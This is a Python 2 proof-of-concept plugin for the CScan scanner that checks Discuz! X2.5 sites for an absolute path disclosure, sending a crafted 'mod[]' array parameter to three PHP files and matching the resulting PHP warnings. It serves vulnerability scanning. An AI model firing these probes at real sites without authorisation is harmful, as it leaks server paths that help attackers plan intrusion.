# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    poc_id = 'dc45f774-1278-42b1-a31f-472ca4867bd1'
    name = 'Discuz! X2.5 绝对路径泄露漏洞' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        Discuz! X2.5 /api.php文件中由于array_key_exists中的第一个参数只能为整数或者字符串，
        当?mod[]=beebeeto时，$mod类型为array，从而导致array_key_exists产生错误信息。
    ''' # 漏洞描述
    ref = 'https://www.webshell.cc/4141.html' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = '2.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4e82e69d-fb20-42ff-8a3e-5100340f1d57'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            file_list =  ['/api.php','/uc_server/control/admin/db.php','/install/include/install_lang.php']
            for filename in file_list:
                verify_url = '{target}'.format(target=self.target)+filename+'?mod[]=beebeeto'
                req = urllib2.urlopen(verify_url)
                content = req.read()
                if 'Warning:' in content and 'array_key_exists():' in content:
                    if '.php on line'  in content:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()
        

if __name__ == '__main__':
    Poc().run()